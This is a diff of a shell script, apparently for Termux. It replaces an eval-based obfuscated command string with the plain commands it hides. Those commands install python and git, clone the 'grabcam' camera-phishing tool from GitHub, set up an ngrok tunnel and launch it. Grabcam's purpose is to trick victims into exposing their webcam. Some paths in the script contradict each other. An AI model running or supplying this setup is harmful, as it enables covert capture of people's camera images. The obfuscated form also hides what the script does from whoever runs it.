@@ -1,3 +1,14 @@
-z="
-";sz='ish/';Zz='//gi';gz='abca';Fz='upgr';yz='chmo';kz='p ng';mz='zip';oz='grok';fz='s/gr';ez='cker';CBz='ok';cz='/noo';qz='ME/C';wz='rabc';BBz=' ngr';jz='unzi';Sz='bash';EBz='bcam';Nz='on2 ';Lz='pyth';Uz='tlee';DBz=' gra';ABz='d +x';Cz='upda';Mz='on -';Hz='-y';Bz='get ';uz='cam';Xz='e ht';lz='rok.';Az='apt-';nz='cp n';az='thub';bz='.com';vz='cd g';Gz='ade ';Oz='git ';hz='m';Kz='all ';Iz='pkg ';Rz='at';Qz='lolc';Wz='clon';Yz='tps:';tz='grab';Vz='.sh';dz='b-ha';Jz='inst';Dz='te -';Tz=' Vre';xz='am';rz='amPh';pz=' $HO';Pz='pip ';iz='ls';Ez='y';
-eval "$Az$Bz$Cz$Dz$Ez$z$Az$Bz$Fz$Gz$Hz$z$Iz$Jz$Kz$Lz$Mz$Ez$z$Iz$Jz$Kz$Lz$Nz$Hz$z$Iz$Jz$Kz$Oz$Hz$z$Pz$Jz$Kz$Qz$Rz$z$Sz$Tz$Uz$Vz$z$Oz$Wz$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$z$iz$z$jz$kz$lz$mz$z$nz$oz$pz$qz$rz$sz$tz$uz$z$vz$wz$xz$z$yz$ABz$BBz$CBz$z$Sz$DBz$EBz$Vz
+﻿apt-get update -y
+apt-get upgrade -y
+pkg install python -y
+pkg install python2 -y
+pkg install git -y
+pip install lolcat
+bash Vretlee.sh
+git clone https://github.com/noob-hackers/grabcam
+ls
+unzip ngrok.zip
+cp ngrok $HOME/CamPhish/grabcam
+cd grabcam
+chmod +x ngrok
+bash grabcam.sh
